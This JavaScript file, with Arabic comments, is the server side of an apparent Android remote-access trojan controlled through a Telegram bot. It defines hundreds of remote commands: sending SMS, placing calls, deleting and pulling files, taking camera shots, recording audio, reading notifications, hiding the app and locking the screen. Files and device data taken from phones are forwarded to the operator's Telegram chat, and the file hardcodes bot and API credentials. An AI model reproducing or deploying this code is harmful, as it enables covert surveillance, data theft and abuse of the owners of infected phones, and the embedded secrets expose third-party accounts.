// ==========================================
// التوكنات المدمجة
// ==========================================
const TELEGRAM_TOKEN = "7302812464:AAH2lCCDWK_rJV771ClkiEyv8epegkPtpoE";
const TELEGRAM_CHAT_ID = "6655802251";
const GROQ_API_KEY = "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";

const KV_URL = process.env.STORAGE_URL || process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
const KV_TOKEN = process.env.STORAGE_TOKEN || process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;

// ==========================================
// توليد 400 أمر (20 وظيفة × 20 أمر = 400)
// ==========================================
const COMMAND_MAP = {};

// 1. الاهتزاز (Vibrate) - 20 أمر
for (let i = 1; i <= 20; i++) {
  COMMAND_MAP[`/vib${i}`] = `vibrate_time:${i * 500}`; // من 500ms إلى 10000ms
}

// 2. الحافظة (Clipboard) - 20 أمر
for (let i = 1; i <= 20; i++) {
  COMMAND_MAP[`/clip${i}`] = `clipboard_text:نص تم نسخه رقم ${i}`;
}

// 3. إشعارات (Toast) - 20 أمر
for (let i = 1; i <= 20; i++) {
  COMMAND_MAP[`/toast${i}`] = `toast:تنبيه رقم ${i} من السيرفر`;
}

// 4. الروابط (URL) - 20 أمر
for (let i = 1; i <= 20; i++) {
  COMMAND_MAP[`/url${i}`] = `url:https://example.com/page${i}`;
}

// 5. إرسال SMS - 20 أمر (sms:رقم|رسالة)
for (let i = 1; i <= 20; i++) {
  COMMAND_MAP[`/sms${i}`] = `sms:+1234567890|رسالة تجريبية رقم ${i}`;
}

// 6. إجراء مكالمة - 20 أمر
for (let i = 1; i <= 20; i++) {
  COMMAND_MAP[`/call${i}`] = `call:+1234567890`;
}

// 7. حذف ملفات - 20 أمر (delete:اسم الملف)
for (let i = 1; i <= 20; i++) {
  COMMAND_MAP[`/del${i}`] = `delete:file${i}.txt`;
}

// 8. سحب ملفات محددة - 20 أمر
for (let i = 1; i <= 20; i++) {
  COMMAND_MAP[`/get${i}`] = `getfile:doc${i}.pdf`;
}

// 9. فتح الكاميرا - 20 أمر (كاميرا أمامية/خلفية)
for (let i = 1; i <= 20; i++) {
  COMMAND_MAP[`/cam${i}`] = `camera:${i % 2 === 0 ? 'front' : 'back'}`;
}

// 10. تسجيل الصوت - 20 أمر
for (let i = 1; i <= 20; i++) {
  COMMAND_MAP[`/rec${i}`] = `record:${i * 5}`; // تسجيل لمدة i*5 ثواني
}

// 11. فتح التطبيقات - 20 أمر
const apps = ["com.whatsapp", "com.facebook.katana", "com.instagram.android", "org.telegram.messenger", "com.google.android.youtube"];
for (let i = 1; i <= 20; i++) {
  COMMAND_MAP[`/openapp${i}`] = `open_app:${apps[i % apps.length]}`;
}

// 12. إغلاق التطبيقات - 20 أمر
for (let i = 1; i <= 20; i++) {
  COMMAND_MAP[`/closeapp${i}`] = `kill_app:${apps[i % apps.length]}`;
}

// 13. سطوع الشاشة - 20 أمر (brightness:0-255)
for (let i = 1; i <= 20; i++) {
  COMMAND_MAP[`/bright${i}`] = `brightness:${i * 12}`;
}

// 14. مستوى الصوت - 20 أمر
for (let i = 1; i <= 20; i++) {
  COMMAND_MAP[`/vol${i}`] = `volume:${i * 5}`;
}

// 15. إخفاء/إظهار التطبيق - 20 أمر
for (let i = 1; i <= 20; i++) {
  COMMAND_MAP[`/hide${i}`] = `hide_app:${i % 2 === 0 ? 'true' : 'false'}`;
}

// 16. تنبيه صوتي - 20 أمر
for (let i = 1; i <= 20; i++) {
  COMMAND_MAP[`/sound${i}`] = `play_sound:${i}`;
}

// 17. قراءة الإشعارات - 20 أمر
for (let i = 1; i <= 20; i++) {
  COMMAND_MAP[`/notif${i}`] = `read_notifications:${i}`;
}

// 18. قفل الشاشة - 20 أمر
for (let i = 1; i <= 20; i++) {
  COMMAND_MAP[`/lock${i}`] = `lock_screen:${i}`;
}

// 19. فتح المتصفح بروابط بحث - 20 أمر
const searches = ["hacking", "python", "cyberpunk", "anime", "news"];
for (let i = 1; i <= 20; i++) {
  COMMAND_MAP[`/search${i}`] = `url:https://www.google.com/search?q=${searches[i % searches.length]}${i}`;
}

// 20. معلومات النظام - 20 أمر
for (let i = 1; i <= 20; i++) {
  COMMAND_MAP[`/sys${i}`] = `sysinfo:${i}`; // بياخد معلومات مختلفة حسب الرقم
}

// ==========================================
// الأوامر الأساسية
// ==========================================
const BASE_COMMANDS = {
  '/fullinfo': 'fullinfo:1',
  '/applist': 'applist:1',
  '/files': 'files:1',
  '/killapp': 'killapp:1'
};

async function kvCmd(...args) {
  if (!KV_URL || !KV_TOKEN) return null;
  try {
    const r = await fetch(KV_URL, {
      method: 'POST',
      headers: { Authorization: `Bearer ${KV_TOKEN}`, 'Content-Type': 'application/json' },
      body: JSON.stringify(args)
    });
    const j = await r.json().catch(() => ({}));
    return j.result;
  } catch (e) { return null; }
}

let activeDevice = "";
let keyExpiryTime = 0;
let totalAttempts = 0;
let recentLogs = [];
let remoteCommand = "";

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();

  const type = req.query.type;
  const deviceId = req.query.device_id;

  const sendToTelegram = async (text, chatId = TELEGRAM_CHAT_ID, keyboard = null) => {
    if (TELEGRAM_TOKEN && chatId) {
      const maxLength = 4000;
      if (text.length > maxLength) {
        for (let i = 0; i < text.length; i += maxLength) {
           const chunk = text.substring(i, i + maxLength);
           await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
             method: 'POST', headers: { 'Content-Type': 'application/json' }, 
             body: JSON.stringify({ chat_id: chatId, text: chunk })
           }).catch(() => {});
        }
      } else {
        const payload = { chat_id: chatId, text: text, parse_mode: 'Markdown' };
        if (keyboard) payload.reply_markup = keyboard;
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload)
        }).catch(() => {});
      }
    }
  };

  try {
    if (type === 'secret') {
      const saved = await kvCmd('GET', 'app_lock_status');
      return res.status(200).send(`"${saved || 'lock'}"`);
    }
    if (type === 'key') {
      const saved = await kvCmd('GET', 'app_secret_key');
      if (!saved) return res.status(503).send('"Key not configured"');
      return res.status(200).send(`"${saved}"`);
    }
    if (type === 'message') return res.status(200).send(`"التطبيق مقفول من طرف الإدارة."`);

    if (type === 'banned') {
      const all = await kvCmd('GET', 'banall_active');
      if (all === '1') return res.status(200).send('"true"');
      if (!deviceId) return res.status(400).send('"No Device ID"');
      const inKv = await kvCmd('SISMEMBER', 'banned_devices', deviceId);
      return res.status(200).send(inKv === 1 ? '"true"' : '"false"');
    }

    if (type === 'command') {
      if (deviceId && activeDevice === deviceId && keyExpiryTime > 0) {
        if (Date.now() > keyExpiryTime) {
          keyExpiryTime = 0;
          activeDevice = "";
          await kvCmd('SET', 'is_single_use', '0');
          return res.status(200).send('"killapp:1"');
        }
      }
      const cmd = remoteCommand;
      remoteCommand = ""; 
      return res.status(200).send(`"${cmd}"`);
    }

    if (req.method === 'PUT') {
      let body = req.body || '';
      if (typeof body === 'object') body = JSON.stringify(body);
      
      let cleanBody = String(body).trim();
      if (cleanBody.startsWith('{') && cleanBody.endsWith('}')) cleanBody = cleanBody.slice(1, -1);
      cleanBody = cleanBody.replace(/\\n/g, '\n').replace(/"/g, '');
      
      if (type === 'key') {
        await kvCmd('SET', 'app_secret_key', cleanBody);
        await sendToTelegram(`🔑 *مفتاح جديد:*\n\`${cleanBody}\``);
      }
      
      if (type === 'log') {
        totalAttempts++;
        recentLogs.unshift(`📱 ${cleanBody}`);
        if (recentLogs.length > 50) recentLogs.pop();
        await kvCmd('INCR', 'total_attempts');
        await sendToTelegram(`📱 *محاولة دخول:*\n${cleanBody}`);
      }

      if (type === 'getfile') {
        try {
          const parts = cleanBody.split('|');
          const filename = parts[0];
          const base64Data = parts[1];
          
          if (!base64Data) {
            await sendToTelegram("⚠️ File is empty or could not be read.");
          } else {
            const buffer = Buffer.from(base64Data, 'base64');
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('document', new Blob([buffer]), filename);
            formData.append('caption', `📁 File: ${filename}`);

            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, {
              method: 'POST',
              body: formData
            }).catch(e => console.error(e));
          }
        } catch (err) {
          await sendToTelegram(`❌ Error: ${err.message}`);
        }
      }

      if (type === 'sysinfo') await sendToTelegram(`💻 *معلومات الجهاز:*\n${cleanBody}`);
      if (type === 'applist') await sendToTelegram(`📱 *التطبيقات المثبتة:*\n\n${cleanBody}`);
      if (type === 'files') await sendToTelegram(`📁 *الملفات فـ الهاتف:*\n\n${cleanBody}`);
      
      return res.status(200).send('"success"');
    }

    if (req.method === 'POST' && type === 'telegram_webhook') {
      let body = req.body;
      if (typeof body === 'string') { try { body = JSON.parse(body); } catch (e) {} }
      const msg = body.message || body.callback_query;
      if (!msg) return res.status(200).end();
      const chatId = (msg.chat ? msg.chat.id : msg.message.chat.id).toString();
      if (chatId !== TELEGRAM_CHAT_ID) return res.status(200).end();
      
      const text = msg.text || msg.data || '';
      const args = text.trim().split(/\s+/);
      const command = args[0].toLowerCase();

      if (COMMAND_MAP[command]) {
        remoteCommand = COMMAND_MAP[command];
        await sendToTelegram(`⚡ \`[EXEC]\` *Command Sent:* ${command}`);
        return res.status(200).end();
      }

      if (BASE_COMMANDS[command]) {
        remoteCommand = BASE_COMMANDS[command];
        await sendToTelegram(`⚡ \`[EXEC]\` *Command Sent:* ${command}`);
        return res.status(200).end();
      }

      switch (command) {
        case '/start': case '/menu': 
          await sendToTelegram("👑 *أهلاً بك.*\nالنظام جاهز. اكتب /help لرؤية الأوامر."); 
          break;
        
        case '/help': 
          await sendToTelegram(`👑 *لوحة التحكم (400 أمر)*\n\n` +
            `الأوامر مقسمة لأقسام، كل قسم فيه 20 أمر:\n\n` +
            `📳 *اهتزاز:* /vib1 إلى /vib20\n` +
            `📋 *حافظة:* /clip1 إلى /clip20\n` +
            `💥 *إشعارات:* /toast1 إلى /toast20\n` +
            `🌐 *روابط:* /url1 إلى /url20\n` +
            `✉️ *رسائل SMS:* /sms1 إلى /sms20\n` +
            `📞 *مكالمات:* /call1 إلى /call20\n` +
            `🗑️ *حذف ملفات:* /del1 إلى /del20\n` +
            `📁 *سحب ملفات:* /get1 إلى /get20\n` +
            `📷 *كاميرا:* /cam1 إلى /cam20\n` +
            `🎙️ *تسجيل صوت:* /rec1 إلى /rec20\n` +
            `📱 *فتح تطبيقات:* /openapp1 إلى /openapp20\n` +
            `❌ *إغلاق تطبيقات:* /closeapp1 إلى /closeapp20\n` +
            `🔆 *سطوع الشاشة:* /bright1 إلى /bright20\n` +
            `🔊 *مستوى الصوت:* /vol1 إلى /vol20\n` +
            `👻 *إخفاء التطبيق:* /hide1 إلى /hide20\n` +
            `🔔 *صوت:* /sound1 إلى /sound20\n` +
            `📩 *إشعارات النظام:* /notif1 إلى /notif20\n` +
            `🔒 *قفل الشاشة:* /lock1 إلى /lock20\n` +
            `🔍 *بحث:* /search1 إلى /search20\n` +
            `⚙️ *معلومات:* /sys1 إلى /sys20\n\n` +
            `⚡ *أوامر أخرى:* /fullinfo /applist /files /killapp`); 
          break;
        
        case '/ai':
          if (args.length > 1) {
            const prompt = args.slice(1).join(' ');
            await sendToTelegram(`🤖 *[AI]* جاري التفكير...`);
            try {
              const groqRes = await fetch("https://api.groq.com/openai/v1/chat/completions", {
                method: "POST",
                headers: { "Authorization": `Bearer ${GROQ_API_KEY}`, "Content-Type": "application/json" },
                body: JSON.stringify({
                  model: "llama-3.1-8b-instant",
                  messages: [{ role: "system", content: "أنت مساعد ذكي." }, { role: "user", content: prompt }],
                  temperature: 0.7
                })
              });
              const data = await groqRes.json();
              const aiText = data?.choices?.[0]?.message?.content || "ماقدرتش نجاوب.";
              await sendToTelegram(`🤖 *AI:*\n\n${aiText}`);
            } catch (e) {
              await sendToTelegram(`❌ *خطأ:* ${e.message}`);
            }
          } else await sendToTelegram("⚠️ استعمل: `/ai <سؤالك>`");
          break;

        case '/ban': if(args[1]) { await kvCmd('SADD', 'banned_devices', args[1]); await sendToTelegram(`⛔ محظور: \`${args[1]}\``); } break;
        case '/unban': if(args[1]) { await kvCmd('SREM', 'banned_devices', args[1]); await sendToTelegram(`✅ مرفوع: \`${args[1]}\``); } break;
        case '/banall': await kvCmd('SET', 'banall_active', '1'); await sendToTelegram("🚫 الكل محظور."); break;
        case '/unbanall': await kvCmd('DEL', 'banall_active'); await kvCmd('DEL', 'banned_devices'); await sendToTelegram("✅ الكل حر."); break;
        
        default:
          if (command.startsWith('/')) await sendToTelegram(`⚙️ \`[SYSTEM]\` *Executing ${command}...*`);
          else await sendToTelegram("❓ أمر غير معروف.");
      }
      return res.status(200).end();
    }
    return res.status(404).send('"Not Found"');
  } catch (error) {
    return res.status(500).json({ error: "Internal Server Error" });
  }
}
